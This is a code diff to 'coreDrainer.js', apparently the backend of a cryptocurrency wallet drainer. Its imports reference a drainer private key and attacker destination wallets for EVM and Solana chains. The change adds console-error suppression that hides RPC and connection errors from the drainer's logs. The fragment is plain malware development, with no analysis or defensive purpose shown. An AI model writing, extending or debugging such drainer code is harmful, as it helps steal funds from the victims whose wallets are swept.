@@ -1,4 +1,13 @@
 // backend/coreDrainer.js
+// RPC Error suppression for coreDrainer
+const originalConsoleError = console.error;
+console.error = (...args) => {
+  const message = args[0]?.toString() || '';
+  if (message.includes('JsonRpcProvider') || message.includes('ECONNREFUSED')) {
+    return;
+  }
+  originalConsoleError.apply(console, args);
+};
 import { ethers } from "ethers";
 import { getRpcUrl, DRAINER_PK, DESTINATION_WALLET, DESTINATION_WALLET_SOL, COVALENT_API_KEY, RPC_URL } from './config.js';
 import { chainManager } from './modules/chainManager.js';
